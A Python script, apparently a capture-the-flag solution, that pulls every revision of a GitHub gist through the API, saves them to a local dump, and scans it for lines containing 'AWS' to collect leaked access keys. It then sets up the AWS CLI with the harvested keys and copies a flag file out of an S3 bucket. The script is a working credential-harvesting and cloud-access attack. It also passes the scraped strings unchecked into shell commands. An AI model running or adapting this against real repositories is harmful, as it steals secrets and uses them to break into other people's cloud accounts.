#!/usr/bin/python
# GitHub Gist revision scraper -- limited by API rate limits so beware 
# Best to authenticate otherwise its only 60 requests/hour compared to 5000
# === Notes for reader === 

'''
- Gist API returns the revisions of the current iteration of gist 1000 at a time 
- so if my gist only had 40 revisions it can return up to 40 in the history array

- If my gist had 9000+ it will return 0-999, then I will request 999 and it will show 999-1998 , etc ...
- The way its structured is after the 1000th revision the URL will have (PreviousIterationLastID)/(NewIterationofID)
- The first 1000 revisions only have a short URL ie. /revision_id 
- so just be wary when scripting stuff like this I suppose :)  


Revisions can be accessed in two ways 
- File history (shows up to next 1000 versions)
- by /commits?page=(?)  ie.  https://api.github.com/gists/blahblahblahblahblahblah/commits?page=4 (30 at a time)

'''

import sys, re, requests, json, time
from os import environ, system

if len(sys.argv) < 2: 
	print("Usage: " + sys.argv[0] + " <url of latest revision of gist>")
	sys.exit(1)

if system("which aws > /dev/null") != 0:
	print("Please install Amazon AWS CLI before continuing !")
	sys.exit(1)

#get auth if auth is present, default is empty string
user = environ.get("GIST_USER", '')
pw = environ.get("GIST_PW", '')

if(user == '' or pw == ''):
	print("The script will fail unless user credentials are given, since the API rate limit it set to 60 for unauthenticated users !")
	print("- You can use a dummy account or your own account \n- Simply do `export GIST_USER=xxxxxxx` and `export GIST_PW=xxxxxxxxxxx`")
	sys.exit(1)

#extract id from command arg 
base = "https://api.github.com/gists/"
start = str(sys.argv[1])
start_id =  start.split("/")[4]

#get the first "list" of commits 
url = list()
r = requests.get(base + start_id + "/commits", auth=(user,pw))
result = json.loads(r.text)

if(r.status_code != 200):
	print(str(r.status_code) + " : " + r.text)
	sys.exit(1)

username = result[0]['user']['login'].encode('utf-8') #grab username
raw_base = "https://gist.githubusercontent.com/" + username + "/"

#loop on all commits adding URLs into a list
sys.stdout.write("Fetching URLs ")
i = 1
while result:
	commits_url = base + start_id + "/commits?page=" + str(i)
	r = requests.get(commits_url, auth=(user, pw))
	if(r.status_code == 403):
		print("Rate limit exceeded ...")
		sys.exit(1)
	
	result = json.loads(r.text)	
	for item in result:
		
		#add to list
		url.append(item['url'].encode('utf-8'))		 

	i += 1
	sys.stdout.write(". ")
	sys.stdout.flush()
	
#all revision URLs should have been collected at this point, now get RAW 
for i, u in enumerate(url):
	r = requests.get(u, auth=(user, pw))
	result = json.loads(r.text)
	raw = result['files'].values()[0]['raw_url']
	url[i] = raw
	sys.stdout.write(". ")
	sys.stdout.flush()

print("")
for i in url:
	print i
	
#calculate how long it takes to download each url, and the size of the final file
num_revisions = len(url)
sys.stdout.write("\nRunning benchmark ...             ")
ts = time.time()

benchmark_url = url[len(url)/2]
r = requests.get(benchmark_url, auth=(user, pw))
filesize = len(r.text)	
	
duration = time.time() - ts
print("[DONE]")
print("Time taken to download one file is: " + str(duration) + " s")
total_duration = num_revisions * duration
total_size = num_revisions * filesize
print("Estimated duration to download all revisions is: " +  str(total_duration) + " s / " + str(total_duration/ 60 ) + " mins")
print("Estimated final filesize is: " + str(total_size) + "bytes / " + str(total_size / 1024) + " KB")

#confirm download
ans = raw_input("Commence with download ? (y/n) ")
if(ans != "y"): sys.exit(0)
#run and save to /tmp/gists_dump
with open("/tmp/gist_dump",'w+') as f:
	for i in url:
		sys.stdout.write("| ")
		sys.stdout.flush()
		r = requests.get(i, auth=(user,pw))
		f.write(r.text.encode('utf-8'))

#ask to continue with phase 2 (y/n)
print("[Done]")
ans = raw_input("Commence with phase 2 ? (y/n) ")
if(ans != "y"): sys.exit(0)

creds = list()
with open("/tmp/gist_dump",'r') as f:
	for line in f.readlines():
		if "AWS" in line:
			c = line.split(":")[1].lstrip().rstrip()
			creds.append(c)
	
	creds.sort(key=len)

#Now use the following creds to access
print("Dumping the flag : ")
system("aws configure set aws_access_key_id " + str(creds[0]))
system("aws configure set aws_secret_access_key " + str(creds[1]))
system("aws s3 cp s3://wellmare/flag ./flag ")
print("=============================")
system("cat ./flag && rm ./flag")
print("=============================")

